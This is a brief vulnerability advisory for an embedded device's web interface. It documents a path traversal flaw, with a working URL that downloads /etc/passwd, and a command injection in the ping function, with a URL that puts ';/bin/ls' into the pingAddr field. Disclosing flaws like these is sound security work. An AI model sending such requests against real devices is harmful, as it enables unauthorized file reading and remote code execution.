    Path Traversal
    The page used to download the configuration file is vulnerable to path traversal, this allows an
    attacker to download any system file.
    http://192.168.0.1:8080/download.conf?filename=/etc/passwd

    Remote code execution (RCE)
    The ping function allows arbitrary code execution. Just add a ; and then the full path of a
    binary:
    http://192.168.0.1:8080/waitPingqry.cgi?showPingResult=1&pingAddr=;/bin/ls

    After the previous request finish, just access the follow page to see the output
